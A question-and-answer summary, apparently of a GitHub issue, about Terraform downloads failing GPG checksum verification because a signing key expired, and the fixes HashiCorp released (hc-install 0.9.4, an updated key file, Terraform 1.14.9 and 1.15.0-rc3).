title: GPG error when trying to download 1.14.8

qa_pairs.question:
Terraform downloads are failing with GPG verification errors. The original report was for Terraform 1.14.8, where downloading the Terraform binary failed with:

`error downloading terraform version 1.14.8: unable to verify checksums signature: openpgp: key expired`

Others noted this was not limited to Atlantis or to Terraform 1.14.8. We are also seeing failures with Terraform 1.11.4. Any idea when this will be resolved? Will fixes be backported to all the older Terraform versions?
qa_pairs.answer: HashiCorp closed the issue after several fixes were made: hc-install released version 0.9.4 to address the verification errors, `https://www.hashicorp.com/.well-known/pgp-key.txt` was changed to contain only the new valid key, and Terraform Stacks users were directed to updated Terraform releases 1.14.9 and 1.15.0-rc3. Downstream tools such as tfswitch or Atlantis may still need to update their dependencies and release new versions, and users should upgrade their local tool versions. The maintainer did not state that fixes would be backported to all older Terraform versions; they said there was nothing else to do in Terraform and to file issues with affected tools or open a new Terraform issue if it is Terraform-related.
